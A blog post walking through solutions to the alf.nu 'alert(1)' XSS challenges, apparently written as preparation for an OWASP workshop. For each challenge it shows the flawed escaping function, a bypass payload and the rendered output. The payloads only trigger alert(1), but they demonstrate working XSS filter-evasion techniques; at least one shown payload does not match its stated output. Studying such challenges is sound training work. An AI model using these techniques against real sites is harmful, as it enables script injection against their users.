---
layout: post
title: escape the XSS (part 1)
categories: [infosec, javascript]
tags: [xss, challenges]
fullview: false
comments: true
---

next tuesday i'm giving a workshop regarding owasp top ten on the office so i'm preparing myself with a quick recap of certain concepts and vulnerabilities so as a warmup i went over the alert(1) to win challenges on [alf.nu](https://alf.nu/alert1)

# Warmup

to those who aren't familiar with these challenges let us quick briefing:

{% highlight javascript %}
function escape(s) {
  return '<script>console.log("'+s+'");</script>';
}
{% endhighlight %}


this javascript code generates HTML in an unsafe way. the goal is to prove it, scaping the input in order to call `alert(1)`.

this first challenge is quite straightforward since we can just close the quotes:

<br><br><br><br><br><br><br><br>**Solution**:<br><br><br><br><br><br><br><br>

```
";)alert(1, "
```


which will output:

{% highlight javascript %}
<script>console.log("");alert(1,"");</script>
{% endhighlight %}

be aware that are many ways to solve the puzzles:

```
"+alert(1))//
```

also wins.

# Adobe

{% highlight javascript %}
function escape(s) {
  s = s.replace(/"/g, '\\"');
  return '<script>console.log("' + s + '");</script>';
}
{% endhighlight %}

there's a replace function which changes the `"` for `\"`, however, mentioned function doesn't escape any other special character so we can add:

`\"`

which is replaced by

`\\"`

allowing us to input `alert(1)`

<br><br><br><br>**Solution**:<br><br><br><br>

```
\");alert(1)//
```

this will output:

{% highlight javascript %}
<script>console.log("\\");alert(1)//");</script>
{% endhighlight %}


# JSON

{% highlight javascript %}
function escape(s) {
  s = JSON.stringify(s);
  return '<script>console.log(' + s + ');</script>';
}
{% endhighlight %} 

the `JSON.stringify` function will take care of double quotes and backslashes but there's a [little detail regarding it](https://medium.com/node-security/the-most-common-xss-vulnerability-in-react-js-applications-2bdffbcc1fa0): it doesn't escapes angle brackets (`<>`)

<br><br><br><br>**Solution**:<br><br><br><br>

```
</script><script>alert(1)</script>
```

this outputs:

{% highlight javascript %}
<script>console.log("</script><script>alert(1)</script>//");</script>
{% endhighlight %}

# Markdown

be aware that some firefox versions can't execute the solution for this one.

{% highlight javascript %}
function escape(s) {
  var text = s.replace(/</g, '&lt;').replace(/"/g, '&quot;');
  // URLs
  text = text.replace(/(http:\/\/\S+)/g, '<a href="$1">$1</a>');
  // [[img123|Description]]
  text = text.replace(/\[\[(\w+)\|(.+?)\]\]/g, '<img alt="$2" src="$1.gif">');
  return text;
} 
{% endhighlight %}

this one is a bit tricky, first of all is a function that parses Markdown syntaxis. i'll recommend to any newcomer to play a bit with the `[[img123|Description]]` test case that is gave on the example. also note that the ALL the `<` and ALL the `/` are escaped. 

<br><br><br><br>**Solution**:<br><br><br><br>

even thought a rare case, we can abuse the regex in order to generate an `img`tag which prompts an ´alert(1)´ with help of ´onerror´: 

```
[[1|http://onerror='alert(1)']]
```

which will output the following:

{% highlight html %}
<img alt="<a href="http://onerror='alert(1)'" src="1.gif">">http://onerror='alert(1)']]</a>
{% endhighlight %}

#DOM 

{% highlight javascript %}
function escape(s) {
  // Slightly too lazy to make two input fields.
  // Pass in something like "TextNode#foo"
  var m = s.split(/#/);

  // Only slightly contrived at this point.
  var a = document.createElement('div');
  a.appendChild(document['create'+m[0]].apply(document, m.slice(1)));
  return a.innerHTML;
}
{% endhighlight %}

the vulnerability here resides on the line:

```
  a.appendChild(document['create'+m[0]].apply(document, m.slice(1)));
```

as we can see every (<>) is escaped to (`&lt;&gt;`)... if we check closer the info that is given on the code we find the comment: `// Pass in something like "TextNode#foo"`... so it's concatenates a string that is `createTextNode`which is a DOM method. the tricky part here is know what's the method that can actually help us to escape the string:

<br><br><br><br>**Solution**:<br><br><br><br>

```
Comment#><script>alert(1)</script>
```

will output:

{% highlight javascript %}
<!--><script>alert(1)</script>-->
{% endhighlight %}

# Callback

{% highlight javascript %}
function escape(s) {
  // Pass inn "callback#userdata"
  var thing = s.split(/#/); 

  if (!/^[a-zA-Z\[\]']*$/.test(thing[0])) return 'Invalid callback';
  var obj = {'userdata': thing[1] };
  var json = JSON.stringify(obj).replace(/</g, '\\u003c');
  return "<script>" + thing[0] + "(" + json +")</script>";
}
{% endhighlight %}

once again we have a function that concatenates user input to call a function in a unsecure way... if we input `callback#raz` we got the following output:

```
<script>callback({"userdata":"raz"})</script>
```

so our input is inserted right on the middle of the scripts tags, we just need to escape the validation, how?

<br><br><br><br>**Solution**:<br><br><br><br>

```
'#';alert(1);//
```

output:

{% highlight javascript %}
<script>'({"userdata":"';alert(1);//"})</script>
{% endhighlight %}

# Skandia

{% highlight javascript %} 
function escape(s) {
  return '<script>console.log("' + s.toUpperCase() + '")</script>';
}
{% endhighlight %}

this one is quite similar to the first one, the thing is if we try input something like `");<script>alert(1)</script>` we got the following output:

```
<script>console.log("");<SCRIPT>ALERT(1)</SCRIPT>")</script>
```

which doesn't exploits... the challenge here resides in finding an input that can bypass the `toUpperCase` method...

<br><br><br><br>**Solution**:<br><br><br><br>

{% highlight javascript %} 
");</script><svg><script>&#x61&#x6C&#x65&#x72&#x74(1)//
{% endhighlight %}

